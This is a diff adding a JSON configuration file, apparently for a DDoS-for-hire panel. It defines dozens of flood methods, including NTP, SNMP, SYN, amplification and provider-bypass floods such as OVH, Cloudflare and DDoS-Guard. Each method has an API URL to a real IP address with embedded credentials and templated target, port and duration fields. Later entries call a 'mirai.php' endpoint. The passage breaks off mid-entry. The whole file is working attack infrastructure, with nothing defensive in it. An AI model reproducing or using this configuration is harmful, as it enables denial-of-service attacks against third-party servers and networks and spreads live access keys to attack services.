@@ -1,0 +1,1264 @@
+{
+     "Attacks" : [
+
+          {
+               "Name" : "NTP",
+               "AttackName" : "NTP",
+               "Description" : "NTP FLOOD",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=NTP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "DVR",
+               "AttackName" : "DVR",
+               "Description" : "DVR Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=DVR",
+               
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+
+               "DefaultPort" : "22",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "WSD",
+               "AttackName" : "WSD",
+               "Description" : "WSD Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=WSD",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "SNMP",
+               "AttackName" : "SNMP",
+               "Description" : "Normal SNMP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=SNMP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ARD",
+               "AttackName" : "ARD",
+               "Description" : "Normal ARD Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=ARD",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "UDPBYPASS",
+               "AttackName" : "UDPBYPASS",
+               "Description" : "Normal UDPBYPASS Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=UDPBYPASS",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "SYNOPT",
+               "AttackName" : "SYNOPT",
+               "Description" : "Normal SYNOPT Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=SYNOPT",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ACKOPT",
+               "AttackName" : "ACKOPT",
+               "Description" : "Normal ACKOPT Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=ACKOPT",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "TCPTFO",
+               "AttackName" : "TCPTFO",
+               "Description" : "Normal TCPTFO Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=TCPTFO",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "TCPTLS",
+               "AttackName" : "TCPTLS",
+               "Description" : "Normal TCPTLS Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=TCPTLS",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "TCPAMP",
+               "AttackName" : "TCPAMP",
+               "Description" : "Normal TCPAMP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=TCPAMP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "IGMP",
+               "AttackName" : "IGMP",
+               "Description" : "Normal IGMP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=IGMP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ESP",
+               "AttackName" : "ESP",
+               "Description" : "Normal ESP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=ESP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "IPRAND",
+               "AttackName" : "IPRAND",
+               "Description" : "Normal IPRAND Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=IPRAND",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "OVH-AMP",
+               "AttackName" : "OVH-AMP",
+               "Description" : "Normal OVH-AMP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=OVH-AMP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "OVHTCP",
+               "AttackName" : "OVHTCP",
+               "Description" : "Normal OVHTCP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=OVHTCP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "PATH-BLEED",
+               "AttackName" : "PATH-BLEED",
+               "Description" : "Normal PATH-BLEED Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=PATH-BLEED",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "NORD-VITAL",
+               "AttackName" : "NORD-VITAL",
+               "Description" : "Normal NORD-VITAL Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=NORD-VITAL",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "WRA-XV",
+               "AttackName" : "WRA-XV",
+               "Description" : "Normal WRA-XV Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=WRA-XV",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "TEMPEST-SERVER",
+               "AttackName" : "TEMPEST-SERVER",
+               "Description" : "Normal TEMPEST-SERVER Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=TEMPEST-SERVER",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "RST-RAPE",
+               "AttackName" : "RST-RAPE",
+               "Description" : "Normal RST-RAPE Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=RST-RAPE",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "CPU-RAIL",
+               "AttackName" : "CPU-RAIL",
+               "Description" : "Normal CPU-RAIL Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=CPU-RAIL",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "K.O",
+               "AttackName" : "K.O",
+               "Description" : "Normal K.O Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=K.O",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "OCTO-DEATH",
+               "AttackName" : "OCTO-DEATH",
+               "Description" : "Normal OCTO-DEATH Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=OCTO-DEATH",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "DEDI-GORE",
+               "AttackName" : "DEDI-GORE",
+               "Description" : "Normal DEDI-GORE Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=DEDI-GORE",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "TCP-BYPASS",
+               "AttackName" : "TCP-BYPASS",
+               "Description" : "Normal TCP-BYPASS Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=TCP-BYPASS",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "UDP-BYPASS",
+               "AttackName" : "UDP-BYPASS",
+               "Description" : "Normal UDP-BYPASS Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=UDP-BYPASS",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "REDSYN",
+               "AttackName" : "REDSYN",
+               "Description" : "Normal REDSYN Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=REDSYN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "RAINSYN",
+               "AttackName" : "RAINSYN",
+               "Description" : "Normal RAINSYN Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=RAINSYN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "VPS-XV",
+               "AttackName" : "VPS-XV",
+               "Description" : "Normal VPS-XV Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=VPS-XV",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "STOMP-XV",
+               "AttackName" : "STOMP-XV",
+               "Description" : "Normal STOMP-XV Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=STOMP-XV",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "BLAZING-XV",
+               "AttackName" : "BLAZING-XV",
+               "Description" : "Normal BLAZING-XV Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=BLAZING-XV",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "RAIL-XV",
+               "AttackName" : "RAIL-XV",
+               "Description" : "Normal RAIL-XV Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=RAIL-XV",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "VPN-DEVIL",
+               "AttackName" : "VPN-DEVIL",
+               "Description" : "Normal VPN-DEVIL Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=VPN-DEVIL",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "OPEN-VPN",
+               "AttackName" : "OPEN-VPN",
+               "Description" : "Normal OPEN-VPN Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=OPEN-VPN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ICMP-DOWN",
+               "AttackName" : "ICMP-DOWN",
+               "Description" : "Normal ICMP-DOWN Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=ICMP-DOWN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "AMP-MIX",
+               "AttackName" : "AMP-MIX",
+               "Description" : "Normal AMP-MIX Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=AMP-MIX",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "KILLALLV2",
+               "AttackName" : "KILLALLV2",
+               "Description" : "Normal KILLALLV2 Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=KILLALLV2",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "TELNET",
+               "AttackName" : "TELNET",
+               "Description" : "Normal TELNET Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=TELNET",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "SERVER-V4",
+               "AttackName" : "SERVER-V4",
+               "Description" : "Normal SERVER-V4 Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=SERVER-V4",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "AVAST-VPN",
+               "AttackName" : "AVAST-VPN",
+               "Description" : "Normal AVAST-VPN Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=AVAST-VPN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "CHOOPA-SLASH",
+               "AttackName" : "CHOOPA-SLASH",
+               "Description" : "Normal CHOOPA-SLASH Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=CHOOPA-SLASH",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "AMAZON-RIP",
+               "AttackName" : "AMAZON-RIP",
+               "Description" : "Normal AMAZON-RIP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=AMAZON-RIP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "DIGI-SPLIT",
+               "AttackName" : "DIGI-SPLIT",
+               "Description" : "Normal DIGI-SPLIT Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=DIGI-SPLIT",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "VPS-CRY",
+               "AttackName" : "VPS-CRY",
+               "Description" : "Normal VPS-CRY Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=VPS-CRY",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "SERVER-V3",
+               "AttackName" : "SERVER-V3",
+               "Description" : "Normal SERVER-V3 Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=SERVER-V3",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "PORT-RAID",
+               "AttackName" : "PORT-RAID",
+               "Description" : "Normal PORT-RAID Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=PORT-RAID",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HYDRA-HELL",
+               "AttackName" : "HYDRA-HELL",
+               "Description" : "Normal HYDRA-HELL Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HYDRA-HELL",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "NFO-ANGEL",
+               "AttackName" : "NFO-ANGEL",
+               "Description" : "Normal NFO-ANGEL Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=NFO-ANGEL",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HOME-MOB",
+               "AttackName" : "HOME-MOB",
+               "Description" : "Normal HOME-MOB Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HOME-MOB",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HOME-LAG",
+               "AttackName" : "HOME-LAG",
+               "Description" : "Normal HOME-LAG Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HOME-LAG",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "NFO-UDP",
+               "AttackName" : "NFO-UDP",
+               "Description" : "Normal NFO-UDP Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=NFO-UDP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HTTPS-CLOUD",
+               "AttackName" : "HTTPS-CLOUD",
+               "Description" : "Normal HTTPS-CLOUD Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HTTPS-CLOUD",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HTTPS-SERVER",
+               "AttackName" : "HTTPS-SERVER",
+               "Description" : "Normal HTTPS-SERVER Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HTTPS-SERVER",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HTTPS-GET",
+               "AttackName" : "HTTPS-GET",
+               "Description" : "Normal HTTPS-GET Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HTTPS-GET",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "WEBSERVER",
+               "AttackName" : "WEBSERVER",
+               "Description" : "Normal WEBSERVER Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=WEBSERVER",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "CLOUDFLARE",
+               "AttackName" : "CLOUDFLARE",
+               "Description" : "Normal CLOUDFLARE Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=CLOUDFLARE",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "WEBSERVER-V2",
+               "AttackName" : "WEBSERVER-V2",
+               "Description" : "Normal WEBSERVER-V2 Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=WEBSERVER-V2",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "BLAZING-FAST",
+               "AttackName" : "BLAZING-FAST",
+               "Description" : "Normal BLAZING-FAST Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=BLAZING-FAST",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "DDOS-GUARD",
+               "AttackName" : "DDOS-GUARD",
+               "Description" : "Normal DDOS-GUARD Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=DDOS-GUARD",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HTTP-XV",
+               "AttackName" : "HTTP-XV",
+               "Description" : "Normal HTTP-XV Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HTTP-XV",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "HTTPS-MOB",
+               "AttackName" : "HTTPS-MOB",
+               "Description" : "Normal HTTPS-MOB Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=HTTPS-MOB",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "STD",
+               "AttackName" : "STD",
+               "Description" : "Normal STD Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=STD",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "SYN",
+               "AttackName" : "SYN",
+               "Description" : "Normal SYN Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=SYN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
